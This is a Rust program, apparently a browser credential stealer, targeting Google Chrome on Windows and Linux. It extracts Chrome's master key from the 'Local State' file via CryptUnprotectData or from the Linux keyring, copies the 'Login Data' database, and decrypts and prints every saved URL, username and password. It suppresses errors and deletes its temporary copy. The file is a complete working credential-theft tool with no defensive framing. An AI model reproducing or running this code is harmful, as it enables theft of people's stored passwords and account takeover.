use lazy_static::lazy_static;
use sqlite;
use std::error::Error;
use std::collections::HashMap;
use std::path;

#[cfg(target_family = "windows")]
use {
    aes_gcm::aead::{Aead, NewAead},
    aes_gcm::{Aes256Gcm, Key, Nonce},
    serde_json as json,
    std::ptr,
    windows::Win32::{
        Security::Cryptography::{CryptUnprotectData, CRYPTOAPI_BLOB},
        System::Memory::LocalFree,
    },
};

#[cfg(not(target_family = "windows"))]
use {
    sha1::Sha1,
    keyring::{
        Entry,
        credential::{PlatformCredential, LinuxCredential}
    },
    aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit},
};

#[cfg(target_family = "windows")]
lazy_static! {
    static ref HOME: String = std::env::var("USERPROFILE").unwrap_or_else(|_| std::process::exit(0));
}
#[cfg(target_family = "unix")]
lazy_static! {
    static ref HOME: String = std::env::var("HOME").unwrap_or_else(|_| std::process::exit(0));
}
lazy_static! {
    static ref PATHS: HashMap<&'static str, &'static str> = HashMap::from([
        ("windows", r"AppData\Local\Google\Chrome\User Data"),
        ("unix", ".config/google-chrome"),
    ]);
}

fn main() {
    unsafe {
        let e = || -> Result<(), Box<dyn Error>> {
            let mut key = read_master_key()?;
            let master_key = decrypt_master_key(&mut key)?;
            extract_passwords(&master_key)?;
            Ok(())
        };
        if let Err(_) = e() {}
        std::fs::remove_file("db_copy.sqlite3").unwrap_or_default();
        std::process::exit(0);
    };
}

#[cfg(target_family = "windows")]
fn read_master_key() -> Result<Vec<u8>, Box<dyn Error>> {
    let local_state_path = path::PathBuf::new()
        .join(HOME.as_str())
        .join(PATHS[std::env::consts::FAMILY])
        .join("Local State");

    let local_state = std::fs::read_to_string(local_state_path)?;
    let v: json::Value = json::from_str(&local_state)?;
    let key = &v["os_crypt"]["encrypted_key"];
    let secret_key_base64 = key.as_str().unwrap_or_default();

    let secret_key = base64::decode(secret_key_base64)?[5..].to_vec();

    Ok(secret_key)
}

#[cfg(target_family = "unix")]
fn read_master_key() -> Result<Vec<u8>, Box<dyn Error>> {
    let keyring_credential = PlatformCredential::Linux(
        LinuxCredential {
            collection: String::from("default"),
            attributes: HashMap::from([
                (String::from("application"), String::from("chrome")),
            ]),
            label: String::from("Google Safe Storage"),
        },
    );

    let entry = Entry::new_with_credential(&keyring_credential)?;
    let secret_key = match entry.get_password() {
        Ok(p) => p.as_bytes().to_vec(),
        Err(_) => return Ok(b"peanuts".to_vec()),
    };

    Ok(secret_key)
}

// https://stackoverflow.com/questions/65969779/rust-ffi-with-windows-cryptounprotectdata
#[cfg(target_family = "windows")]
unsafe fn decrypt_master_key(
    et_bytes: &mut Vec<u8>,
) -> Result<Vec<u8>, Box<dyn Error>> {
    let size = u32::try_from(et_bytes.len())?;

    let mut p_data_in = CRYPTOAPI_BLOB {
        cbData: size,
        pbData: et_bytes.as_mut_ptr(),
    };
    let mut p_data_out = CRYPTOAPI_BLOB::default();

    let pin = &mut p_data_in;
    let pout = &mut p_data_out;

    CryptUnprotectData(
        pin,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        pout,
    );

    if !p_data_out.pbData.is_null() {
        let output = std::slice::from_raw_parts(p_data_out.pbData, p_data_out.cbData as _);

        LocalFree(p_data_out.pbData as _);

        Ok(output.to_vec())
    } else {
        std::process::exit(0);
    }
}

#[cfg(target_family = "unix")]
fn decrypt_master_key(password: &mut Vec<u8>) -> std::io::Result<Vec<u8>> {
    let salt = b"saltysalt";
    let rounds = 1;
    let mut res: [u8; 16] = [0; 16];
    pbkdf2::pbkdf2::<hmac::Hmac<Sha1>>(password, salt, rounds, &mut res);
    Ok(res.to_vec())
}

fn extract_passwords(key: &Vec<u8>) -> Result<(), Box<dyn Error>> {
    let login_data_path = path::PathBuf::new()
        .join(HOME.as_str())
        .join(PATHS[std::env::consts::FAMILY])
        .join("Default")
        .join("Login Data");
    let temp_db = "db_copy.sqlite3";
    std::fs::copy(login_data_path, temp_db)?;

    let conn = sqlite::open(temp_db)?;
    let mut statement =
        conn.prepare("SELECT action_url, username_value, password_value FROM logins;")?;

    let headers = "URL; Username; Password";
    println!(
        "{text}\n{len}",
        text = headers,
        len = "-".repeat(headers.len())
    );
    while let sqlite::State::Row = statement.next()? {
        let action_url = statement.read::<String>(0)?;
        let username_value = statement.read::<String>(1)?;
        let password_value = statement.read::<Vec<u8>>(2)?;

        let decrypted_pass = decrypt_password(&password_value, &key)
            .unwrap_or("<couldn't decrypt password>".as_bytes().to_vec());
        println!(
            "{}; {}; {}",
            action_url,
            username_value,
            String::from_utf8(decrypted_pass)?
        );
    }

    Ok(())
}

#[cfg(target_family = "windows")]
fn decrypt_password(
    password: &Vec<u8>,
    key: &Vec<u8>,
) -> Result<Vec<u8>, Box<dyn Error>> {
    let iv = &password[3..15];
    let payload = &password[15..];

    let nonce = Nonce::from_slice(iv);
    let aes_key = Key::from_slice(key);
    let cipher = Aes256Gcm::new(aes_key);

    let plaintext = cipher.decrypt(nonce, payload).or(Err(""))?;
    Ok(plaintext)
}


#[cfg(target_family = "unix")]
fn decrypt_password(
    password: &Vec<u8>,
    key: &Vec<u8>
) -> Result<Vec<u8>, Box<dyn Error>> {
    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

    let key: [u8; 16] = key.as_slice().try_into()?;
    let payload = &password[3..];
    let iv = [0x20; 16];
    let mut buf_vec = vec![0; payload.len()];
    let mut buf = buf_vec.as_mut_slice();

    let plaintext = Aes128CbcDec::new(&key.into(), &iv.into())
        .decrypt_padded_b2b_mut::<Pkcs7>(payload, &mut buf)
        .or(Err(""))?;

    Ok(plaintext.to_vec())
}
